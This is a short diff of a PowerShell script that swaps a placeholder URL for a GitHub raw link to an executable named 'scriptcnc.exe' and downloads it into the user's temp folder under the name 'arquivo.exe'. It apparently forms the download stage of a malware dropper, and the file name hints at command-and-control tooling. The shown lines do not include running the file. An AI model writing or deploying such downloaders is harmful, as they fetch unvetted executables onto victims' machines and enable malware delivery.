@@ -1,4 +1,4 @@
-$url = "https://www.example.com/arquivo.exe"
+$url = "https://github.com/gean3721/executaveis/raw/main/scriptcnc.exe"
 $destination = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "arquivo.exe")
 
 Invoke-WebRequest -Uri $url -OutFile $destination
